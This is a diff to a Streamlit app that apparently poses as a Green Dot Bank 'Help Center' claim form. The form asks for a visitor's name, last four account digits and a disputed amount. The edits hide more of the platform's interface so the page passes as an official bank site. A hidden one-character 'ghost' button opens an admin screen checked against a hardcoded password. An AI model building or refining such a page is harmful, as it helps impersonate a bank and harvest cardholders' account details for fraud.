@@ -31,10 +31,12 @@ st.markdown("""<style>
     .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
     .block-container { max-width: 500px !important; padding-top: 1.5rem !important; }
 
-    [data-testid='stHeader'], header, footer, .stDeployButton, .section-anchor, 
-    [data-testid='stToolbar'], [data-testid='stElementToolbar'], 
+    /* Hide Streamlit elements and header anchors */
+    [data-testid='stHeader'], header, footer, .stDeployButton, 
+    .section-anchor, a.section-anchor, [data-testid='stHeaderActionElements'],
+    [data-testid='stToolbar'], [data-testid='stElementToolbar'],
     .st-emotion-cache-140j12g, button[title='View fullscreen'] {
-        display: none !important; visibility: hidden !important;
+        display: none !important; visibility: hidden !important; height: 0 !important; width: 0 !important;
     }
 
     /* Disable pointers globally for images/headers except in promo box */
@@ -50,7 +52,7 @@ st.markdown("""<style>
         font-weight: 600 !important;
         width: 100% !important;
         height: 45px !important;
-        pointer-events: auto !important; /* Re-enable for functional buttons */
+        pointer-events: auto !important; 
     }
 
     /* STEALTH LOGIN */
@@ -63,9 +65,9 @@ st.markdown("""<style>
     .promo-box {
         background-color: #111; padding: 30px; text-align: center;
         border-radius: 12px; margin: 25px 0; border: 1px solid #222;
-        pointer-events: auto !important; /* MANDATORY: Re-enable interaction here */
+        pointer-events: auto !important; 
     }
-    
+
     .promo-box a, .promo-box img {
         pointer-events: auto !important;
         cursor: pointer !important;
@@ -88,7 +90,7 @@ if not st.session_state.admin_mode:
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
 
-    with st.form("claim_v32_7_3", clear_on_submit=True):
+    with st.form("claim_v32_7_4", clear_on_submit=True):
         st.text_input("Full Name")
         st.text_input("Last 4 digits of Account")
         st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -112,14 +114,14 @@ if not st.session_state.admin_mode:
 
     st.markdown("<div class='legal-container'>Green Dot&reg; cards are issued by Green Dot Bank, Member FDIC. &copy;2026 Green Dot Corporation.</div>", unsafe_allow_html=True)
 
-    if st.button(".", key="ghost_dot"): 
+    if st.button(".", key="ghost_dot"):
         st.session_state.admin_mode = True
         st.rerun()
 else:
     st.title("Admin Access")
     pw = st.text_input("Auth Key", type="password")
-    if st.button("CHECK"): 
+    if st.button("CHECK"):
         if pw == "Diostieneelpoder1": st.write("Access Granted")
-    if st.button("↩"): 
+    if st.button("↩"):
         st.session_state.admin_mode = False
         st.rerun()
